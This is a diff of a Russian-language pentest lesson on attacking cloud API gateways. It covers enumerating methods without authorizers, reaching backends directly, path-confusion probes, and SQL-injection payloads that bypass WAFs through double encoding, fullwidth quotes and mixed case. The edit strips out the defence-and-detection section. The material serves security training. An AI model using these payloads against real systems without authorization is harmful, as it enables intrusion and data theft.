@@ -15,193 +15,142 @@ estimated_minutes: 45
 summary: "Как устроены API Gateway (AWS), API Management (Azure) и Apigee/API Gateway (GCP), как искать методы без авторизации, обходить авторизаторы и WAF и находить расхождения между шлюзом и бэкендом."
 ---
 
-## Зачем этот урок
+## Задача
 
-Облачный API Gateway — это публичная дверь к бэкенду: Lambda, контейнерам, микросервисам. AWS API Gateway, Azure API Management (APIM) и GCP Apigee/API Gateway публикуют внутренние сервисы в интернет. Атакующий ищет здесь три вещи: **методы без авторизации**, **слабую проверку токенов** и **расхождения между шлюзом и бэкендом** (path confusion, request smuggling), которые позволяют обойти защиту. Плюс WAF перед API часто настроен на сигнатуры и легко обходится вариациями кодирования. Этот урок — про разведку API Gateway, поиск ошибок авторизации и обход WAF.
+Перед тобой публичный API `https://api.example.com`, за которым стоит внутренний бэкенд. Хочешь добраться до бэкенда в обход авторизации. Облачный **API Gateway** — это фасад к бэкенду (Lambda, контейнерам, микросервисам), и ошибки фасада открывают внутренние сервисы. Задача урока — найти **методы без авторизации**, **слабую проверку токенов** и **расхождения между шлюзом и бэкендом** (path confusion), а также обойти WAF.
 
-## Как устроены API Gateway и WAF
+## Что такое API Gateway и WAF
 
-- **AWS API Gateway (REST/HTTP/WebSocket).** Ресурсы и методы (`GET /users`), интеграции (Lambda, HTTP, AWS-сервисы), **authorizers** (IAM, Cognito, Lambda custom), usage plans и API keys, resource policies (IP/VPCE), stage variables.
-- **Azure API Management (APIM).** Products, subscriptions (subscription keys), policies (XML-пайплайн), backends, JWT validation, rate limit. Может «скрывать» реальные пути.
-- **GCP Apigee / API Gateway / Cloud Endpoints.** Proxy, quotas, API keys, JWT validation, ESPv2.
-- **WAF.** AWS WAF (rules, managed rule groups), Azure WAF (Front Door/App Gateway), Cloud Armor (GCP). Работает по сигнатурам и эвристикам.
+- **AWS API Gateway (REST/HTTP/WebSocket)** — ресурсы и методы (`GET /users`), интеграции (Lambda, HTTP, сервисы AWS), **authorizers** (IAM, Cognito, Lambda custom), stage variables.
+- **Azure API Management (APIM)** — Products, subscription keys, XML-политики, JWT validation.
+- **GCP Apigee / API Gateway** — proxy, quotas, API keys, JWT validation.
+- **WAF** — AWS WAF, Azure WAF, Cloud Armor. Работает по **сигнатурам и эвристикам**, а не по смыслу.
 
-Ключевые слабости:
+Ключевые слабости, которые мы ищем:
 
-- Метод/ресурс опубликован без authorizer (`authorizationType: NONE`).
+- Метод опубликован без authorizer (`authorizationType: NONE`).
 - Authorizer проверяет наличие токена, но не его подпись/аудиторию.
-- API key в клиентском коде (мобильное/веб) — не секрет.
-- Расхождение нормализации пути: шлюз проверяет `/admin`, а бэкенд резолвит `/admin/` или `//admin`, `/admin%2f`.
-- WAF-сигнатуры обходятся двойным кодированием, Unicode, комментариями, регистром.
-- Отсутствие проверки метода: `OPTIONS`/`HEAD`/`TRACE` могут пройти мимо правил.
+- API key в клиентском коде — не секрет.
+- Расхождение нормализации пути: шлюз проверяет `/admin`, а бэкенд резолвит `/admin/` или `/admin%2f`.
+- WAF обходится двойным кодированием, Unicode, регистром.
 
-## Инструменты и команды
+## Данные, с которыми работаем
 
-Разведка AWS:
-
-```bash
-aws apigateway get-rest-apis --query 'items[].{Id:id,Name:name}'
-aws apigateway get-resources --rest-api-id <id> --query 'items[].{Path:path,Methods:resourceMethods}'
-# Методы без авторизации
-aws apigateway get-method --rest-api-id <id> --resource-id <rid> --http-method GET \
-  --query 'authorizationType'
-# NONE означает отсутствие авторизатора
-```
-
-Разведка Azure APIM:
+Разведка AWS API Gateway:
 
 ```bash
-az apim list --query '[].{Name:name,RG:resourceGroup,URL:gatewayUrl}'
-az apim api list --service-name myapim -g myrg --query '[].{Name:name,Path:path,ServiceUrl:serviceUrl}'
-# Subscription keys / products
-az apim product list --service-name myapim -g myrg
+$ aws apigateway get-rest-apis --query 'items[].{Id:id,Name:name}'
+[{"Id":"abc123","Name":"orders-api"}]
+$ aws apigateway get-resources --rest-api-id abc123 \
+    --query 'items[].{Path:path,Methods:resourceMethods}' --output json
+[{"Path":"/orders","Methods":{"GET":{"authorizationType":"COGNITO_USER_POOLS"},
+                              "POST":{"authorizationType":"NONE"}}}]
 ```
 
-Разведка GCP:
+Метод `POST /orders` — **без авторизации** (`NONE`). Это прямая находка.
+
+## Шаг 1: находим интеграцию и бэкенд
 
 ```bash
-gcloud api-gateway gateways list
-gcloud api-gateway api-configs list --api=myapi
+$ aws apigateway get-integration --rest-api-id abc123 --resource-id rid --http-method POST \
+    --query '{Type:type,Uri:uri}'
+{"Type":"HTTP_PROXY","Uri":"https://internal-api.example.com/orders"}
 ```
 
-Фаззинг путей и методов (с учётом auth):
+Шлюз проксирует в `internal-api.example.com`. Проверяем, доступен ли бэкенд напрямую:
 
 ```bash
-# Методы без токена
-ffuf -u https://api.example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
-  -mc 200,201,401,403 -H "Authorization: Bearer $TOKEN"
-
-# Path confusion: разные нормализации
-for p in "/admin" "/admin/" "//admin" "/./admin" "/%2e/admin" "/admin%2f" "/Admin"; do
-  echo -n "$p -> "; curl -s -o /dev/null -w "%{http_code}\n" "https://api.example.com$p" -H "Authorization: Bearer $TOKEN"
-done
+$ curl -s -o /dev/null -w "%{http_code}\n" https://internal-api.example.com/orders
+200
 ```
 
-WAF-обход (примеры):
+Бэкенд открыт из интернета — шлюз и его WAF обойдены полностью.
+
+## Шаг 2: path confusion
+
+Если бэкенд нормализует путь иначе, чем шлюз, можно добраться до «скрытых» ресурсов:
 
 ```bash
-# Двойное кодирование
-curl "https://api.example.com/item?id=1%2527%2520OR%25201=1"
-# Unicode/полноширинный
-curl "https://api.example.com/item?id=1%EF%BC%87%20OR%201=1"
-# Разный регистр ключевых слов
-curl "https://api.example.com/item?id=1 uNiOn SeLeCt 1,2,3"
+$ curl -s -o /dev/null -w "%{http_code}\n" "https://api.example.com/admin" -H "Authorization: Bearer $TOKEN"
+403
+$ curl -s -o /dev/null -w "%{http_code}\n" "https://api.example.com/admin/" -H "Authorization: Bearer $TOKEN"
+200
+$ curl -s -o /dev/null -w "%{http_code}\n" "https://api.example.com/orders/../admin" -H "Authorization: Bearer $TOKEN"
+200
 ```
 
-## Разобранный пример: обход авторизатора и доступ к бэкенду
+Шлюз проверял `/admin` и вернул 403, а бэкенд резолвит `/admin/` и `/orders/../admin` в тот же ресурс — доступ получен.
 
-Сценарий: REST API в AWS API Gateway, методы защищены Cognito authorizer, но есть бэкенд-сервис, доступный напрямую.
+## Шаг 3: проверяем авторизатор
 
-Шаг 1 — перечисляем методы и их authorizationType:
+Если authorizer — Lambda, проверяем, что он валидирует: подпись JWT, `aud`, `iss`, `exp`. Часто проверяется только наличие токена, и поддельный токен проходит. Если authorizer — Cognito, проверь `aud` (клиент) и группы.
+
+## Шаг 4: обход WAF
+
+WAF срабатывает по сигнатурам. Варьируем представление того же запроса:
 
 ```bash
-aws apigateway get-resources --rest-api-id abc123 \
-  --query 'items[].{Path:path,Methods:resourceMethods}' --output json
-# {"Path":"/orders","Methods":{"GET":{"authorizationType":"COGNITO_USER_POOLS"},
-#                              "POST":{"authorizationType":"NONE"}}}
+$ curl "https://api.example.com/item?id=1%2527%2520OR%25201=1"      # двойное кодирование
+$ curl "https://api.example.com/item?id=1 uNiOn SeLeCt 1,2,3"        # регистр
+$ curl "https://api.example.com/item?id=1%EF%BC%87%20OR%201=1"       # полноширинная кавычка
 ```
 
-Метод `POST /orders` — **без авторизации**. Это прямая находка.
+WAF декодирует один раз, бэкенд — снова; поэтому двойное кодирование проходит.
 
-Шаг 2 — находим интеграцию и, возможно, backend URL:
+## Полный прогон от начала до конца
 
-```bash
-aws apigateway get-integration --rest-api-id abc123 --resource-id rid --http-method POST \
-  --query '{Type:type,Uri:uri}'
-# {"Type":"HTTP_PROXY","Uri":"https://internal-api.example.com/orders"}
-```
+1. `get-resources` → `POST /orders` без авторизации.
+2. `get-integration` → бэкенд `internal-api.example.com`.
+3. Прямой доступ к бэкенду → 200 (шлюз обойдён).
+4. Path confusion: `/admin/`, `/orders/../admin` → 200.
+5. WAF-обход двойным кодированием.
 
-Шаг 3 — пробуем бэкенд напрямую. Если он доступен из интернета (misconfig), шлюз и его WAF обойдены:
+## Если не сработало
 
-```bash
-curl -s https://internal-api.example.com/orders -X POST -d '{"id":1}'
-```
+- **Проверяешь только GET.** POST/PUT/DELETE/OPTIONS могут быть без авторизации — проверяй все.
+- **Считаешь API key защитой.** Ключ идентифицирует проект, а не пользователя, и утекает.
+- **Игнорируешь stages.** `dev`/`staging` могут быть менее защищены, чем `prod`.
+- **Путаешь 401 и 403.** 401 — нет аутентификации, 403 — нет прав; путь обхода разный.
+- **Бэкенд изолирован.** Если прямой доступ закрыт, остаются path confusion и WAF-обход.
+- **Перебираешь WAF «в лоб».** Без понимания правила это шум; сравнивай `403`/`400`/норму и варьируй одну характеристику за раз.
 
-Шаг 4 — path confusion. Если бэкенд нормализует путь иначе, чем шлюз, можно добраться до «скрытых» ресурсов:
+## Как работает WAF и как его обходят
 
-```bash
-curl -s "https://api.example.com/admin" -H "Authorization: Bearer $TOKEN"          # 403 (WAF/authorizer)
-curl -s "https://api.example.com/admin/" -H "Authorization: Bearer $TOKEN"         # 200 (обход)
-curl -s "https://api.example.com/orders/../admin" -H "Authorization: Bearer $TOKEN" # 200
-```
-
-Шаг 5 — если authorizer — Lambda, проверьте, что он валидирует: подпись JWT, `aud`, `iss`, `exp`. Часто проверяется только наличие токена, и поддельный/чужой токен проходит.
-
-Шаг 6 — эксплуатация найденного доступа: чтение/изменение данных, вызов внутренних функций. Записывайте метод, путь и результат.
-
-## Варианты атак и обходы
-
-- **`authorizationType: NONE`.** Метод без авторизатора — самый частый баг.
-- **Weak JWT validation.** Authorizer проверяет формат, но не подпись; или принимает любой `aud`.
-- **API key в клиенте.** Ключ из мобильного/веб-кода — не секрет; ищите его и используйте.
-- **Stage variables и environments.** `dev`/`staging` stage может быть менее защищён, чем `prod`.
-- **Resource policy bypass.** Политика разрешает только по IP/VPCE; если вы внутри сети — обходите.
-- **WAF bypass.** Двойное кодирование, Unicode, `/**/`, смена регистра, HTTP/2 smuggling.
-- **Request smuggling.** Расхождение `Content-Length`/`Transfer-Encoding` между шлюзом и бэкендом.
-- **Path traversal к backend.** `/orders/../admin`, `%2e%2e`, двойные слэши.
-- **CORS misconfig.** `Access-Control-Allow-Origin: *` с credentials — утечка через браузер.
-- **GraphQL на шлюзе.** Introspection, batch-запросы, обход depth-limit.
-
-## Частые ошибки и подводные камни
-
-- **Проверять только `GET`.** POST/PUT/DELETE/OPTIONS могут быть без авторизации.
-- **Считать API key защитой.** Ключ идентифицирует проект, а не пользователя; он утекает.
-- **Игнорировать stages.** У API несколько stage с разными настройками.
-- **Путать 401 и 403.** 401 — нет аутентификации, 403 — нет прав; путь обхода разный.
-- **Не проверять прямой доступ к backend.** Часто бэкенд не изолирован.
-- **Перебирать WAF «в лоб».** Без понимания правила это шум; анализируйте ответы и стройте гипотезы.
-
-## Защита и детект
-
-- **Явные authorizer на каждый метод.** Никаких `NONE` для непубличных ресурсов.
-- **Строгая валидация JWT.** Подпись, `iss`, `aud`, `exp`, `nbf`.
-- **Единая нормализация пути** между шлюзом и бэкендом; бэкенд не доступен напрямую.
-- **WAF с актуальными правилами** и логированием; не полагайтесь только на сигнатуры.
-- **Детект.** CloudWatch Logs/access logs API Gateway, AWS WAF logs, Azure APIM analytics, Cloud Armor logs. Алерты на 403/401 всплеск, на необычные пути, на вызовы без токена, на аномальные User-Agent.
-- **Rate limiting и quotas** для ограничения перебора.
-
-## WAF: как он работает и как его обходят
-
-WAF — это набор правил, которые инспектируют запрос (URL, заголовки, тело, cookies) и блокируют подозрительное. AWS WAF использует правила с условиями и managed rule groups (AWSManagedRulesCommonRuleSet, SQLiRuleSet и др.); Azure WAF — OWASP CRS; Cloud Armor — выражения и предопределённые правила. Ключевое ограничение: WAF работает по **сигнатурам и эвристикам**, а не по смыслу, поэтому обходится вариациями представления того же запроса.
-
-Классы обходов:
-
-- **Кодирование.** Двойное URL-кодирование (`%2527` → `%27` → `'`), смешение hex/Unicode (`%u0027`), UTF-8 overlong. WAF декодирует один раз, бэкенд — снова.
-- **Разбиение.** `/**/` между ключевыми словами SQL, `un/**/ion`, комментарии `--`, `#`.
-- **Регистр.** `uNiOn SeLeCt` — некоторые сигнатуры регистрозависимы.
-- **Полноширинные символы.** `＇` (U+FF07) вместо `'` — бэкенд нормализует, WAF нет.
-- **Разные транспорты.** Тело как `multipart/form-data` вместо `application/x-www-form-urlencoded`, JSON вместо query.
-- **HTTP/2 и smuggling.** Расхождения парсинга между WAF и бэкендом.
-- **Параметры-дубликаты.** `?id=1&id=1' OR 1=1` — WAF проверяет первое значение, бэкенд — последнее.
-- **Заголовки.** Инъекция через `X-Forwarded-For`, `Referer`, cookies, которые WAF не проверяет.
-- **Обход по пути.** WAF-правило на `/api/`, но бэкенд принимает `/api//`, `/api/.`, `/api/..;/`.
-
-Практический подход: определите, что именно блокируется (сравнивайте ответы `403` vs `400` vs нормальный), и варьируйте **одну** характеристику за раз. Инструменты: `wafw00f` для фингерпринта, `ffuf` с кастомными пейлоадами, `nuclei` с тегами `waf`.
+WAF инспектирует URL, заголовки, тело, cookies и блокирует подозрительное. AWS WAF использует правила и managed rule groups, Azure WAF — OWASP CRS, Cloud Armor — выражения. Ограничение: WAF работает по сигнатурам, поэтому обходится вариациями представления. Классы обходов: **кодирование** (двойное URL-кодирование, Unicode, overlong UTF-8), **разбиение** (`un/**/ion`), **регистр**, **полноширинные символы**, **разные транспорты** (JSON вместо query), **дубликаты параметров** (`?id=1&id=1' OR 1=1`), **инъекция в заголовки** (`X-Forwarded-For`, `Referer`), **обход по пути** (`/api//`, `/api/..;/`). Инструменты: `wafw00f` для фингерпринта, `ffuf`/`nuclei` с кастомными пейлоадами.
 
 ## Практический чек-лист проверки API Gateway
 
-1. Перечислите все API/сервисы и их stage/environment.
-2. Для каждого метода выпишите `authorizationType`/политику — ищите `NONE`.
-3. Проверьте, валидируется ли JWT полностью (подпись, `aud`, `iss`, `exp`).
-4. Найдите API keys/subscription keys в клиентском коде и проверьте их права.
-5. Проверьте прямой доступ к backend-URL (обход шлюза).
-6. Протестируйте path confusion: `/x`, `/x/`, `//x`, `/./x`, `/x%2f`, регистр.
-7. Проверьте методы OPTIONS/HEAD/TRACE и их поведение.
-8. Оцените WAF: фингерпринт, затем точечные обходы.
-9. Проверьте CORS: `Access-Control-Allow-Origin` с credentials.
-10. Проверьте rate limiting и лимиты (можно ли перебирать).
+1. Перечисли все API/сервисы и их stage/environment.
+2. Для каждого метода выпиши `authorizationType` — ищи `NONE`.
+3. Проверь, валидируется ли JWT полностью (подпись, `aud`, `iss`, `exp`).
+4. Найди API keys в клиентском коде и проверь их права.
+5. Проверь прямой доступ к backend-URL (обход шлюза).
+6. Протестируй path confusion: `/x`, `/x/`, `//x`, `/./x`, `/x%2f`, регистр.
+7. Проверь методы OPTIONS/HEAD/TRACE.
+8. Оцени WAF: фингерпринт, затем точечные обходы.
+9. Проверь CORS: `Access-Control-Allow-Origin` с credentials.
+10. Проверь rate limiting (можно ли перебирать).
 
-Этот порядок ведёт от «что опубликовано» к «как это обойти», покрывая типовые ошибки конфигурации.
+Этот порядок ведёт от «что опубликовано» к «как это обойти». Учти заметность: access logging шлюза и WAF logs фиксируют все пробы, а 403-всплеск — сигнал для SOC.
 
-## Логирование и заметность
+## Что мы теперь знаем
 
-API Gateway логирует запросы по-разному: AWS — access logging (в CloudWatch/S3) и execution logging (CloudWatch Logs), Azure APIM — analytics и Application Insights, GCP — Cloud Logging. Эти логи содержат путь, метод, статус, User-Agent, иногда заголовки и IP. Для OPSEC это означает, что все ваши пробы path confusion и WAF-обходы останутся в логах. AWS WAF тоже логирует заблокированные запросы (`waf-logs`), поэтому агрессивный фаззинг виден. Практические соображения: используйте один-два точечных запроса вместо широкого ffuf там, где нужна тишина; помните, что 403-всплеск — сигнал для SOC. С другой стороны, если логи утекают в бакет с доступом у вас, они сами становятся источником разведки (пути, параметры, токены в query). При пентесте фиксируйте, включены ли логи и куда они пишутся — это часть оценки защищённости.
+- `authorizationType: NONE` = метод публичный — самый частый баг.
+- Слабый authorizer проверяет наличие токена, но не подпись/`aud`.
+- Path confusion использует разную нормализацию пути между шлюзом и бэкендом.
+- Прямой доступ к бэкенду обходит шлюз и WAF целиком.
+- WAF обходится вариациями кодирования и представления запроса.
+- API key в клиенте — не секрет.
 
-## Что дальше / решение
+## На что смотреть дальше
 
-API Gateway — это фасад, и ошибки фасада открывают бэкенд. Начните с полного перечисления ресурсов и методов, ищите `NONE`, слабые authorizer и доступ к бэкенду напрямую. Затем — path confusion и WAF-обход. Найденный доступ эксплуатируйте и документируйте. Если API защищён корректно, переходите к бизнес-логике и инъекциям внутри разрешённых методов. Записывайте каждый обойдённый контроль как отдельную находку с точным запросом и ответом.
+- **cloud-network-security**: периметр, из которого доступен бэкенд.
+- **cloud-serverless**: Lambda за шлюзом и её права.
+- **cloud-ec2-ssrf**: если в API есть SSRF — путь к metadata.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что означает authorizationType: NONE у метода API Gateway?"
@@ -236,7 +185,19 @@ API Gateway — это фасад, и ошибки фасада открываю
     - "Использование GET вместо POST"
   answer: 0
   explanation: "Разные кодировки обходят сигнатурные правила WAF."
+- question: "Почему прямой доступ к бэкенду особенно опасен?"
+  options:
+    - "Он обходит шлюз и его WAF целиком"
+    - "Он медленнее"
+    - "Он требует MFA"
+    - "Он только для чтения"
+  answer: 0
+  explanation: "Если бэкенд доступен из интернета, все контроли шлюза не применяются."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **разведку облака** — cloudfox, enumerate-iam и pacu. А пока главное запомни: **API Gateway — это фасад; ошибки авторизации и нормализации пути открывают бэкенд, а WAF обходится вариациями кодирования.**
 
 ## Где пригодится
 
